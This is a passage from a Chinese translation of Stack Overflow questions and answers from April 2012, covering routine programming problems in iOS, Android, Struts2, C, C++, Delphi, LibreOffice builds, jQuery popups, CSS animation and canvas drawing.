  NSString *documentsPath = [paths objectAtIndex:0];
  NSString *filePath = [documentsPath stringByAppendingPathComponent:@"YourPDF.pdf"]; 
 if(![[NSFileManager defaultManager] fileExistsAtPath:filePath]){
           // download file , here "https://s3.amazonaws.com/hgjgj.pdf" = pdf downloading link
         NSData *pdfData = [[NSData alloc] initWithContentsOfURL:[NSURL URLWithString:@"https://s3.amazonaws.com/hgjgj.pdf"]];
            //Store the downloaded file  in documents directory as a NSData format
         [pdfData writeToFile:filePath atomically:YES];
    }

     NSURL *url = [NSURL fileURLWithPath:filePath];
     NSURLRequest *requestObj = [NSURLRequest requestWithURL:url];
     [yourWebView setUserInteractionEnabled:YES];
     [yourWebView setDelegate:self];
     yourWebView.scalesPageToFit = YES;
     [yourWebView loadRequest:requestObj]; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-27T09:19:52.743

仅出于阅读目的，您可以通过 url 在 Uiwebview 中加载 pdf 文件。

# android - Android应用内导入CSV限制？

> ID：10347891
> 
> 赞同：0
> 
> 时间：2012-04-27T09:09:21.543
> 
> 标签：android, in-app-purchase, google-play, in-app-billing

我正在尝试将 CSV 文件上传到我在 Google Play 中的应用程序。有超过 2.000 种产品。在导入期间，只上传了大约 150 个，从那以后我无法导入其余的。以下是我所面临的描述......

1.  我创建了包含 2.000 多个产品的 CSV 文件
2.  已处理，但仅保存了大约 150 个产品
3.  我正在尝试再次上传相同的文件，并选中了“覆盖”，并且我反复收到信息：“无法处理发送的文件。检查，是否没有超出限制。”

有没有人有类似的问题？您使用哪些浏览器来管理导入？对于通过应用内计费提供的产品数量，也许存在一些未记录的限制？

最好的问候， 托马斯

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T19:34:09.810

好吧，我知道解决方案。此问题是由过长的标题引起的。无论如何-消息不清楚，因此找到它只是一种运气..

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T09:28:48.333

通过联系 Google Play 开发者支持，您可能会获得更好的运气。或者，只需将您的 CSV 拆分为 100 个行块并逐个导入。

# validation - struts2 准备和验证

> ID：10347893
> 
> 赞同：0
> 
> 时间：2012-04-27T09:09:24.143
> 
> 标签：validation, parameters, struts2, interceptor, prepare

我试图确保在调用操作时给出预期的参数（比如显示用户配置文件我想确保参数包含用户 ID：viewUser.action?userId=1 应该可以正常工作，但 viewUser.action 应该重定向到错误页面）

所以我创建了一个验证 xml，指定 userId 字段不能为空。一切正常。

但是现在，在 prepare() 上，我使用 userId 做了一些前期工作。事实是，在验证拦截器之前调用了准备拦截器，因此如果 userId 为 null，那么我有一个很好的 nullPointerException 并且不会调用验证，因为之前发生了错误。我知道我可以切换拦截器顺序，但我不想。

所以我的问题是：我应该在 prepare() 方法中使用参数吗？还有其他方法可以处理吗？

感谢和抱歉我的英语不好:(

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T09:14:43.963

使用“paramsPrepareParamsStack”拦截器堆栈。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-28T21:40:54.920

以下是关于如何避免此问题并使所有开发更容易的解释，但最直接的解决方案无疑是 Daves。我肯定会首先实施该问题并解决该问题并在将来使用以下内容。

根据我的经验，prepare() 用于获取服务，这将使操作完成它的工作，这最好由依赖注入（Spring）提供。

通常，动作类负责以下内容：

*   获取执行操作所需的对象（服务对象）。
*   获取执行操作所需的参数（服务对象用于获取我们需要的参数）。
*   验证参数是有意义的（验证方法/注释，可以外部化到 xml）。
*   执行操作（使用前面提到的服务对象）。
*   获取视图所需的对象...

您知道这一点，并且您还知道准备是关于获取执行操作所需的对象（理想情况下是服务对象，尽管有些人会做诸如打开数据库连接之类的事情）。实际做的应该仅限于执行方法。

采用理想的路线，即使用通过您选择的 DI 提供者（Spring/Guice）注入的服务对象，我们发现自己几乎没有理由需要 prepare 方法。结果，我们的动作变得更小、更容易理解和更容易测试。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-27T10:11:52.913

您可以在 struts-default.xml 文件中更改拦截器的默认顺序，因此复选框和参数拦截器将在准备拦截器之前启动。

```
<interceptor-stack name="basicStack">
  <interceptor-ref name="exception"/>
  <interceptor-ref name="servletConfig"/>
  <interceptor-ref name="checkbox"/>
  <interceptor-ref name="params"/>
  <interceptor-ref name="prepare"/>
  <interceptor-ref name="conversionError"/>
</interceptor-stack> 
```

但我不喜欢这个主意。我认为更好的方法是更改​​您的操作逻辑并从准备函数中删除所有代码部分（如果它们使用某些参数）。为什么你在“准备”中这样做？您想在验证期间使用结果吗？

# android - Android - 将本地 html 读取为文本文件：使用 InputStreamReader.read 和 BufferedReader.readLine 之间的区别

> ID：10347895
> 
> 赞同：0
> 
> 时间：2012-04-27T09:09:26.100
> 
> 标签：android, text, inputstream, innerhtml, bufferedreader

我必须将 html 作为文本文件读取，并且我已经实现了 SO 线程中描述的两种不同方法。我清理了 html，只留下了正文内容，使用 document.write(string) 将其放入 DOM 中，但只有在我使用 Bufferedreader.readLine() 时才有效（在循环中附加 stringBuilder）。事实上，如果我在 Logcat 窗口中打印 stringBuilder.toString() 我会看到当使用 BufferedReader.readLine() 时 stringBuilder 在 Logcat 窗口中显示在单行上，而使用 InputStreamReader.read(charArray,0, (int)numBytes) 它显示多行（我使用的是真实设备）。也许这可能是相关的，并提出了问题所在。我的问题是：我如何清理或处理 read(charArray,0,(int)numBytes) 读取的 char 数组与 readLine() 循环中附加的 stringBuilder 相同？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T09:14:44.160

该[`BufferedReader.readLine()`](http://developer.android.com/reference/java/io/BufferedReader.html#readLine%28%29)方法读取到行尾并返回 **不包括**换行符的值。因此，当您将其附加到 a 时，`StringBuffer`所有内容都会附加到一行。但是，在 的情况下[`InputStreamReader.read`](http://developer.android.com/reference/java/io/InputStreamReader.html#read%28char%5b%5d,%20int,%20int%29)，还包含换行符，导致字符串显示为多行。

为了使行为相似，您必须在使用时跳过换行符`InputStreamReader.read`。

# javascript - 在页面内加载的页面 --> 单独加载页面时转发到 index.html

> ID：10347898
> 
> 赞同：1
> 
> 时间：2012-04-27T09:09:47.610
> 
> 标签：javascript, html, forwarding

我编写了一个网站，它使用 JavaScript 加载器将 index.html 中的 html 文件加载到特定的 div 中。单独加载的 html 页面如下所示：

```
<div id="pageloader">
    CONTENT
</div> <!-- END #pageloader --> 
```

自然地，当页面自己加载时，没有任何样式表连接到它，并且 index.html 的其余部分都丢失了。

有没有办法在自己访问“加载器页面”时自动转发到 index.html？我通过将此标头添加到“加载器页面”尝试了一个简单的转发，但现在它总是转发到 index.html，即使通过 index.html 访问“加载器页面”也是如此。

```
<head>
    <meta http-equiv="refresh" content="0; URL=http://...">
</head> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T09:18:48.840

这有点快-'n'-脏，但您可以在包含页面检查的加载器中设置一个变量。

在您的装载机中：

```
<script type="text/javascript">
  var loader = 1;
</script> 
```

在加载的页面中：

```
<script type="text/javascript">
  if (loader != 1) {
    window.location = "/index.html";
  }
</script> 
```

# c - C struct 数组赋值问题

> ID：10347906
> 
> 赞同：0
> 
> 时间：2012-04-27T09:10:10.953
> 
> 标签：c, arrays, struct

我是 C 新手，我正在使用结构数组。我在为其赋值时遇到了麻烦。这是我的结构..

```
struct student{
        char firstname[30];
        char surname[30];
        int streetNo;
        char streetName[30];
        char suburb[30];
        char state[4];
        int postCode;
        char DOB[10];
        int studentNo;
        char gender;
        char courseNo[4];
        char active;
        int WAM;
    };
struct student person[1000]; 
```

这是我为结构赋值

```
person[100].firstname = "dan"; 
```

这是我的错误

```
 assignment type mismatch: array[30] of char "=" pointer to char 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-27T09:14:40.500

尽管您可以像这样从字符串文字*初始化*字符数组

```
char str[] = "dan"; 
```

您不能按照您尝试的方式将字符串文字*分配*给字符数组。

您需要使用字符串*复制*函数之一将字符串复制到字符数组中：

```
strcpy(person[100].firstname, "dan"); 
```

如果您想复制`"dan"`到前四个元素中并`firstname`用零填充其余元素，请使用`strncpy`：

```
strncpy(person[100].firstname, "dan", 30); 
```

值得指出的是，您可以创建`firstname`一个指针，并为您的字符串动态分配内存，或直接分配它：

```
 struct student{
    char *firstname;
    char *surname;
    /* and so on... */
 };

 student[100].firstname = "dan";
 student[100].surname = "brown"; 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-27T09:15:32.807

您只能在声明时像这样初始化数组，否则您需要使用

```
strcpy(person[100].firstname,"dan"); 
```

你甚至不能用一个简单的 char 数组那样做

```
char a[30];
a="dan"; 
```

编译器会告诉：

```
incompatible types when assigning to type ‘char[30]’ from type ‘char *’ 
```

因为“dan”是一个字符串文字，它由一个指针保存，不能像这样分配给一个数组。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-04-27T09:14:22.957

在 C 中，这样的字符串是使用字符数组实现的。字符数组正是您所定义的，但不可能像这样在 C 中直接分配字符串。您必须为此使用字符串函数。要使用的功能是`strcpy()`. 你必须像这样分配： -

```
strcpy(person[100].firstname, "dan"); 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-04-27T09:16:36.423

**数组不是指针**，这是它的一个例子。不能分配数组，只能分配数组*元素*。你可以做

```
 person[100].firstname[0] = 'd';
 person[100].firstname[1] = 'a';
 person[100].firstname[2] = 'n';
 person[100].firstname[3] = '\0'; /* Pretty tedious... */ 
```

或者，如果您知道您复制的字节数不超过 30 个，

```
 strcpy (person[100].firstname, "dan"); 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-04-27T09:14:43.543

数组名称本身给出数组基地址。数组基地址不能是左侧值。

```
 person[100].firstname  = 
```

给你错误，因为你正在为数组基地址分配一些其他值，这是不允许的。

你可以初始化

```
char stringArray[]  = "some string"; 
```

但你不能为已经声明的数组赋值

```
 char stringArray[100];
  stringArray     =   "some string";  <== error 
```

您的替代方法是使用 strcpy

```
 strcpy(stringArray, "sometext"); 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-04-27T09:15:02.917

具体问题是您试图将字符串分配给字节数组。

在这种特殊情况下，您需要做的是将所需字符串的内容复制到数组中，如下所示：

```
strncpy(person[100].firstname, "dan", 30); 
```

一个更普遍的问题是你正在做的事情很糟糕。对于这样的学生记录，唯一明智的做法是使用适当的数据库；在您的情况下，使用[SQLite](http://sqlite.org)可能是合适的。像这样使用数据库进行简单的学习练习可能看起来有点矫枉过正，但这种经验会在以后帮助你很多。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2012-04-27T09:15:32.947

您可以`strcpy()`为 char 数组赋值。

```
strcpy(person[100].firstname,"Dan"); 
```

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2012-04-27T09:15:33.587

您不能像这样将其分配给数组。即使没有结构。那是

```
char name[10];
name = "ert"; 
```

是一个错误。

（您只能在初始化时执行此操作`char name[10] = "ert";`）

正确的做法是

```
strcpy(person[100].firstname, "dan"); 
```

更安全地使用它的变体`strcpy`需要最大大小的字符串。

# c++ - wcsdup 分配的内存是否应该被显式释放？

> ID：10347907
> 
> 赞同：2
> 
> 时间：2012-04-27T09:10:18.523
> 
> 标签：c++, c, windows, posix

[wcsdup](http://pubs.opengroup.org/onlinepubs/9699919799/functions/wcsdup.html)等函数会隐式调用 malloc 为目标缓冲区分配内存。我想知道由于内存分配不是很明确，所以明确释放存储似乎合乎逻辑吗？这更像是一个设计困境，支持和反对的原因如下

**应该被释放，因为**

1.  不释放它会导致内存泄漏。
2.  有据可查的是，wcsdup/_wcsdup 调用 malloc 来分配内存，即使它是从 C++ 程序调用的。

**不应该被释放，因为**

1.  wcsdup 积累的内存最终会在程序退出时被释放。在整个程序生命周期中，我们总是会遇到一些内存泄漏（除非我们大量调用 wcsdup 以获得较大的缓冲区大小）。
2.  这可能会令人困惑，因为 free 之前没有显式的 malloc。
3.  由于它不是标准的一部分但符合 posix，Microsoft 实现可能不会使用 malloc 来分配目标缓冲区。

应该采取什么方法？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-04-27T09:16:09.690

来自[MSDN](http://msdn.microsoft.com/en-us/library/y471khhc%28v=vs.80%29.aspx)：

> 最好总是通过在返回的指针上调用空闲例程来释放此内存

从您链接的页面：

> 返回的指针可以传递给 free()

这似乎相当明确：如果您关心内存泄漏，那么您应该使用`free`.

老实说，我很担心由此暗示的骑士态度：

> 在整个程序生命周期中，我们总是会遇到一些内存泄漏

很少有充分的理由泄漏内存。即使您今天编写的代码是一次性的，并且不是一个长期存在的过程，您能否确定不会有人将其复制并粘贴到其他程序中？

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-27T09:15:58.237

是的，当您使用完堆分配的内存并知道这样做是安全的时，您应该始终释放它。您链接到的文档甚至指出：

> 对于像 malloc() 一样分配内存的函数，应用程序应该在调用 free() 不再需要时释放这些内存。对于 wcsdup()，这是返回值。

如果您担心免费可能会令人困惑，请发表评论解释。不过，老实说，这似乎是多余的。当一个指针被显式释放时，很明显它是由释放它的代码“拥有”的，任何感到困惑的人都可以轻松地查找`wcsdup`文档。

此外，您的程序中真的不应该有内存泄漏。实际上，某些程序确实存在内存泄漏，但这并不意味着它们可以存在。另请注意，仅仅因为您为程序的整个生命周期分配了一块内存，如果您在整个持续时间内仍在使用它，它就不会*泄漏内存。*

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-27T09:17:49.407

从您自己的链接：

> 对于像 malloc() 一样分配内存的函数，应用程序应该在调用 free() 不再需要时释放这些内存。

来自 MSDN：

> _strdup 函数调用 malloc 为 strSource 的副本分配存储空间，然后将 strSource 复制到分配的空间。

并且从 MSVC 2005 开始不推荐使用 strdup 并调用它调用 _strdup 所以它使用 malloc

# iphone - 删除行分隔符但不删除 UITableView 中的边框

> ID：10347912
> 
> 赞同：9
> 
> 时间：2012-04-27T09:10:31.103
> 
> 标签：iphone, xcode, uitableview

我想删除分组表格视图单元格中的行分隔符，而不是表格的边框。我使用此代码删除了分隔符，但它也删除了边框：

`profileTable.separatorColor:[UIColor clearColor];`

**屏幕截图解释了我需要什么**。

是否有任何代码可用于删除它？

![截屏](../Images/f4338b0708946a24f822302bad6f87d3.png)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-27T09:12:49.240

以下代码可能对您有所帮助。

```
profileTable.separatorStyle = UITableViewCellSeparatorStyleNone; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-27T09:27:07.057

您的问题的一种解决方案可能是为您的分组表格视图创建自定义布局。因此，您将创建单元格的顶部、中间和底部部分，然后仅在侧面添加边框。

我使用了本教程：[http ://cocoawithlove.com/2009/04/easy-custom-uitableview-drawing.html](http://cocoawithlove.com/2009/04/easy-custom-uitableview-drawing.html)

* * *

## 回答 #3

> 赞同：-3
> 
> 时间：2012-04-27T09:27:26.737

```
var tableView = Ti.UI.createTableView({ separatorColor: 'transparent', backgroundColor: '#FFFFFF' }); 
```

# c++ - 将向量参数传递为空

> ID：10347915
> 
> 赞同：1
> 
> 时间：2012-04-27T09:10:42.480
> 
> 标签：c++, vector, constructor, parameter-passing, stdvector

我一直在使用这个类：

```
class DogTrainer 
{
    public:
        DogTrainer(int identity,const std::string& nom, const std::vector<Dog*> dogz) :    
         idD(identity),
         name(nom),
         trainees(dogz)
    { };

        ~DogTrainer();

    private:
        int idD;
        string name;
        std::vector<Dog*> trainees;
}; 
```

但有时当我想实例化一个新对象时，我不需要传递“受训者”参数，所以我希望有可能这样做

```
DogTrainer* Trainer=new DogTrainer(my_id, my_name); 
```

因此我试图改变我的 DogTrainer 构造函数

```
DogTrainer(int identity,const std::string& nom, const std::vector<Dog*> dogz="") :
    idD(identity), 
    name(nom), 
    trainees(dogz)
{ }; 
```

但它没有用，所以请帮忙！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-27T09:14:05.553

将您的构造函数声明为：

```
DogTrainer(int identity,const std::string& nom,
           const std::vector<Dog*> dogz = std::vector<Dog*>()); 
```

`""`是 a `const char*`，并且 a`std::vector`不能由此构造。

顺便说一句，`dogz`成为`const std::vector<Dog*>`. 要么将其设为非`const`，要么将其设为`const`参考。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-27T09:14:32.687

它不起作用，因为您试图将空字符串分配给`vector`. 只需重载构造函数，省略最后一个参数。

```
DogTrainer(int identity,const std::string& nom, const std::vector<Dog*> dogz)
    :idD(identity), name(nom), trainees(dogz) {
};

DogTrainer(int identity,const std::string& nom):idD(identity), name(nom) {
}; 
```

从用户的角度来看，这实际上与您想要实现的目标相同。

# delphi - Delphi：您能否在 DLL 中定义组件类并在运行时加载和创建它？

> ID：10347921
> 
> 赞同：4
> 
> 时间：2012-04-27T09:11:05.740
> 
> 标签：delphi, dll, components

对不起，如果这是一个愚蠢的问题，但这不是我以前必须做的事情。

是否可以在 DLL 中创建组件类，例如 TPanel 或 TDBGrid 的后代，然后在运行时在另一个应用程序中加载该 DLL，然后创建这些控件并像普通 Delphi 组件一样使用它们？

如果是这样，你能给我任何关于从哪里开始做这件事的指示吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-27T09:43:06.067

这就是[包](http://delphi.wikia.com/wiki/Creating_Packages)的用途。它们是一种经过改进以与 Delphi 类（包括组件）配合使用的 DLL。

请记住，您需要与可执行文件和 DLL 一起分发 RTL[ver].bpl、VCL[ver].bpl 和任何其他必要的运行时包。

理想情况下，您应该在从未安装过 Delphi/RAD Studio 的 VM 或系统上测试您的应用程序。这样，如果您的发行版缺少任何必需的包文件，“执行”对话框将告诉您需要包含哪些文件。

# compilation - LibreOffice 在线构建

> ID：10347924
> 
> 赞同：0
> 
> 时间：2012-04-27T09:11:33.157
> 
> 标签：compilation, gtk, libreoffice, gdk

我正在尝试编译 libreoffice，以“在线”使用它，即：在网络浏览器中（参见此处的演示：[http](http://www.youtube.com/watch?v=CVR7HqDokmA "LibreOffice 在线演示") ://www.youtube.com/watch?v=CVR7HqDokmA ）。

运行可执行文件时，我收到此错误：

```
**Gdk-ERROR **: Unsupported GDK backend: broadway** 
```

这些是我在 Ubuntu 11.10 Linux 机器上编译 libreoffice 的步骤：

```
cd /opt
mkdir -p libreoffice
cd libreoffice/

git clone git://anongit.freedesktop.org/libreoffice/core
cd core

cat >> /etc/apt/sources.list << EOT

deb http://ppa.launchpad.net/libreoffice/ppa/ubuntu oneiric main
deb-src http://ppa.launchpad.net/libreoffice/ppa/ubuntu oneiric main
EOT

sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 1378B444
sudo apt-get update
sudo apt-get build-dep libreoffice

sudo apt-get install -y libgnomevfs2-dev
sudo apt-get install -y doxygen

./autogen.sh --enable-gtk3 --without-java --disable-mozilla --without-system-mozilla
make

make dev-install

cd install/program;
. ./ooenv;
export SAL_USE_VCLPLUGIN=gtk3
export GDK_BACKEND=broadway
./soffice --writer 
```

* * *

这里有什么问题？我可以检查任何其他编译选项吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-27T10:42:09.297

似乎您的 GTK 尚未在启用 Broadway 后端的情况下编译。取决于你的发行版。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-07T13:43:16.640

正如 liberforce 正确指出的那样，您需要一个支持 BROADWAY 的 GTK。我刚刚发现 ubuntu 12.04 附带了支持 BROADWAY 的 GTK ......

# javascript - js显示隐藏功能

> ID：10347925
> 
> 赞同：0
> 
> 时间：2012-04-27T09:11:33.760
> 
> 标签：javascript, jquery

我知道有很多脚本可以显示和隐藏内容，但是当涉及到我的场景时，它们都不适合我。在这个测试页面[http://bloghutsbeta.blogspot.com/2012/04/testing-game-content-issue.html](http://bloghutsbeta.blogspot.com/2012/04/testing-game-content-issue.html) 我在 iframe 中有 flash 游戏，如果你点击 PLAY 按钮或者你不点击 flash内容开始在 Chrome 和 IE 中加载（不在 Firefox 中）。

因此，为了处理这种情况，我想到了使用显示和隐藏内容方法并使用了一些脚本，但它们都没有帮助，即使当我使用它们时，Flash 内容仍然用于在 IE 和 Chrome 的后端加载。我要的是一个脚本，在执行“onclick”功能之前不会让 Flash 内容加载。我知道一个脚本可以执行“LazyLoad”，但它适用于图像，我认为它也不适用于 Flash 内容。

注意：1-提供的链接上有音乐 2-很抱歉提供 blogspot 链接，但 JsFiddle 不适用于生活在阿富汗且速度为 5KBps 的人。

相关标记：灯箱或模式窗口的按钮

```
<a class="poplight" href="#?w=100%" rel="popup_name"><img alt="play game" class="happybutton" onmouseout="this.style.opacity=0.8;this.filters.alpha.opacity=80" onmouseover="this.style.opacity=1;this.filters.alpha.opacity=100" src="http://farm5.static.flickr.com/4084/4998558471_27e3985c16_m.jpg" style="opacity: 0.8;" /></a> 
```

在单击上述按钮之前，内容设置为不显示（这实际上在 IE 和 Chrome 中仅在 Firefox 中不起作用）

```
<div class="popup_block" id="popup_name">
<iframe width="100%" height="98%" src="http://files.cryoffalcon.com/bhgames/dressup/Celebrities/Wizard%20Fashion.html" frameborder="0" scrolling="no" allowTransparency="false"
></iframe>
</div> 
```

CSS：

```
#fade { 
    display: none; 
    background: #000;
    position: fixed; left: 0; top: 0;
    width: 100%; height: 100%;
    opacity: .80;
    z-index: 9999999;
}

.popup_block{
   width: 98.95%; height: 98.2%;
    display: none;
    padding: 0px;
    line-height:1em;
    font-size: 1em;
    position: fixed;
    top: 0px; left: 0px;
    z-index: 999999999;
    -webkit-box-shadow: 0px 0px 20px #000;
    -moz-box-shadow: 0px 0px 20px #000;
    box-shadow: 0px 0px 20px #000;
    -webkit-border-radius: 10px;
    -moz-border-radius: 10px;
    border-radius: 10px;
}
.close {
    height:20px;
    float: right;
    margin: 0 2px 0 0;   
} 
```

JS（实际上是 Jquery）

```
&lt;script type=&quot;text/javascript&quot;&gt;
    $(document).ready(function(){

        //When you click on a link with class of poplight and the href starts with a # 
        $(&#39;a.poplight[href^=#]&#39;).click(function() {
            var popID = $(this).attr(&#39;rel&#39;); //Get Popup Name
            var popURL = $(this).attr(&#39;href&#39;); //Get Popup href to define size

            //Pull Query &amp; Variables from href URL
            var query= popURL.split(&#39;?&#39;);
            var dim= query[1].split(&#39;&amp;&#39;);
            var popWidth = dim[0].split(&#39;=&#39;)[1]; //Gets the first query string value

            //Fade in the Popup and add close button
            $(&#39;#&#39; + popID).fadeIn().css({ &#39;width&#39;: Number( popWidth ) }).prepend(&#39;&lt;a href=&quot;#&quot; title=&quot;Close It&quot; class=&quot;close&quot;&gt;&lt;img src=&quot;http://files.cryoffalcon.com/bloghuts/images/close%20button.png&quot; alt=&quot;Close&quot; width=&quot;20&quot; height=&quot;20&quot; /&gt;&lt;/a&gt;&#39;);

            //Define margin for center alignment (vertical + horizontal) - we add 80 to the height/width to accomodate for the padding + border width defined in the css
            var popMargTop = ($(&#39;#&#39; + popID).height() + 0) / 0;
            var popMargLeft = ($(&#39;#&#39; + popID).width() + 0) / 0;

            //Apply Margin to Popup
            $(&#39;#&#39; + popID).css({ 
                &#39;margin-top&#39; : -popMargTop,
                &#39;margin-left&#39; : -popMargLeft
            });

            //Fade in Background
            $(&#39;body&#39;).append(&#39;&lt;div id=&quot;fade&quot;&gt;&lt;/div&gt;&#39;); //Add the fade layer to bottom of the body tag.
            $(&#39;#fade&#39;).css({&#39;filter&#39; : &#39;alpha(opacity=80)&#39;}).fadeIn(); //Fade in the fade layer 

            return false;
        });

        //Close Popups and Fade Layer
        $(&#39;a.close, #fade&#39;).live(&#39;click&#39;, function() { //When clicking on the close or fade layer...
            $(&#39;#fade , .popup_block&#39;).fadeOut(function() {
                $(&#39;#fade, a.close&#39;).remove();  
        }); //fade them both out

            return false;
        });

    });

    &lt;/script&gt; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-27T10:04:12.163

您应该在单击按钮后立即尝试这样的操作来加载您的框架：

```
$(document).ready(function(){
    $('a.poplight[href^=#]').click(function() {
        $('<iframe/>')
            .attr('frameborder', 0)
            .attr('allowTransparency', false)
            .attr('scrolling', 'no')
            .attr('width', '100%')
            .attr('height', '98%')
            .attr('src', 'http://files.cryoffalcon.com/bhgames/dressup/Celebrities/Wizard%20Fashion.html')
            .appendTo('#popup_name');
    });
}); 
```

**更新：**要在弹出窗口关闭时删除框架，您可以使用：

```
$('#popup_name .close').live('click', function() {
    $('#popup_name iframe').remove();
}); 
```

# actionscript-3 - 如何通过桌面应用程序中的代码创建容器中显示的元素的pdf

> ID：10347930
> 
> 赞同：0
> 
> 时间：2012-04-27T09:11:53.253
> 
> 标签：actionscript-3, flex4, adobe

我有一个带有一些控件的边界容器。我想在单击按钮时创建在容器中显示的元素的 pdf 文档。我怎样才能做到这一点？请帮忙

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-03T11:20:30.083

您可以使用 PurePDF 开源 ActionScript 库生成 PDF。[单击此处获取 PurePDF 源](http://code.google.com/p/purepdf/)

你也会发现这个例子。

# css - 简化 CSS3 动画 @keyframes

> ID：10347931
> 
> 赞同：8
> 
> 时间：2012-04-27T09:11:57.843
> 
> 标签：css, css-animations

几个月前，我构建了一个动画 CSS3 AT-AT [http://www.ruawebdesign.com/css3-at-at](http://www.ruawebdesign.com/css3-at-at)。我构建它主要是作为一个学习实验，并看看使用新的 CSS3 功能可以实现什么。像我们构建的大多数东西一样，我将它发布到网上。我没想到它收到的网站会有大量流量。我想可能是朋友和同事的一些观点，但它每周仍然有来自世界各地的几百个观点。

因此，我想让它在 CPU 使用率方面更加精简。由于某种原因，动画会限制内存。我会很感激你们可爱的人对 stackoverflow 的任何反馈，这些反馈可以让人们在没有粉丝参与的情况下查看我的实验。

同样在有人建议使用 javascript/jquery 替代方案之前，请记住我构建它是为了测试 CSS3 的功能。

提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-27T22:38:12.000

不错的作品。你让我看到了 CSS3 在动画方面的潜力。

很遗憾，我无法回答您提出的问题，但我正在接受动画师培训，因此我可以提出一些建议来帮助您改进动画：

1.  两条腿同时抬起：左前和右后同时抬起，然后右前和左后同时抬起。他们必须是相反的腿才能保持平衡。

2.  未抬起的腿应保持在地面上，但在场景中向后移动以模拟身体相对于其位置向前移动的事实。

3.  由于地面上的腿向后滑动，身体自然会稍微降低。

4.  如果您想增加更多的真实感，请在抬起的腿再次到达地面后立即使身体稍微下降，然后再站起来。这将使它看起来像重心转移到那些腿上。

# java - Java Quaqua 弹出菜单

> ID：10347932
> 
> 赞同：0
> 
> 时间：2012-04-27T09:12:03.460
> 
> 标签：java, macos, swing

我有一个在使用 Quaqua 的 OSX 上运行的 Java Swing 应用程序。所有的 TextFields 和 TextAreas 在右键单击时都有一个弹出菜单。这必须由 Quaqua 完成，因为它在 Swing 中不是标准的。

我的问题是：

如何在弹出菜单上设置自己的操作？

请注意。这是关于**Quaqua**弹出菜单而不是任何 Swing 弹出菜单的问题。如果您对 Quaqua 不熟悉，请不要回答。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T09:19:19.917

弹出菜单与常规菜单相同。[Swing 关于菜单](http://docs.oracle.com/javase/tutorial/uiswing/components/menu.html)的教程涵盖了如何使用它们，如何插入条目，...。阅读该教程应该可以帮助您入门

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-07-19T19:01:15.273

Quaqua 设置的弹出菜单可以通过设置客户端属性来移除：

```
myTextField.putClientProperty("Quaqua.TextComponent.showPopup", Boolean.FALSE); 
```

然后，您可以添加自己的 MouseListener 来处理创建自己的弹出菜单。

但是，我还没有想出要使这种更改全局化，因此我必须分别在每个文本字段上设置客户端属性，这有点痛苦。

# java - 收到 CurlException 类型的 Facebook 错误响应

> ID：10347937
> 
> 赞同：2
> 
> 时间：2012-04-27T09:12:36.697
> 
> 标签：java, facebook-opengraph, restfb

当我发布操作时（如此处所述[https://developers.facebook.com/docs/opengraph/tutorial/#publish](https://developers.facebook.com/docs/opengraph/tutorial/#publish)），有时我会收到来自 Facebook 的 cURL 错误：

```
com.restfb.exception.FacebookGraphException: Received Facebook error response of type CurlException: cURL Error [#22, CURLE_HTTP_NOT_FOUND]: Transfer failed 
```

我在 Java 中使用 com.restfb 库。大多数情况下，这非常有效。

任何想法？

**5月3日更新**

好的，我可能已经找到了解决方案。每次我收到“CURLE_HTTP_NOT_FOUND”时，我的“og:image”内容都是一个发送“404 not found”HTTP 错误的 url。这是一个错误。

我会修复它，很快就会回来；）

# javascript - 递归树构造

> ID：10347942
> 
> 赞同：0
> 
> 时间：2012-04-27T09:13:13.167
> 
> 标签：javascript, tree

我将在 javascript 中递归地绘制树，这就是我现在所做的

```
<!DOCTYPE HTML>
<html>
<head>
<title >Canvas  Tree </title>
</head>
<body>
<canvas id="testCanvas"  width="800" height="800" >
canvas not supported
</canvas>
<script>
var canvas=document.getElementById('testCanvas');
var ctx=canvas.getContext('2d');
var alpha=-30*Math.PI/180;
var beta=35*Math.PI/180;
function tree(){
ctx.beginPath();
ctx.moveTo(0,0);
ctx.lineTo(0,-100);
ctx.stroke();
}
ctx.translate(400,650);
tree();
ctx.translate(0,-100);
ctx.rotate(alpha);
//ctx.rotate(beta);
tree();
ctx.rotate(beta-alpha);
tree();

</script>
</body>
</html> 
```

我想，我需要一些可以递归调用的另一个函数，在这个函数中会有基本情况，这里这个过程应该完成，一些绘图过程然后调用自己几次，但我猜不出应该是什么基本情况,还有如何实现它,请帮我实现这个新功能

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T09:36:33.957

一般来说，有两种方法可以解决这个问题：

1.  简单地“画”一棵树（即画出构成你的树的线条，就像你在这里开始做的那样）
2.  渲染树数据结构（使用一些外部 JS 库）。

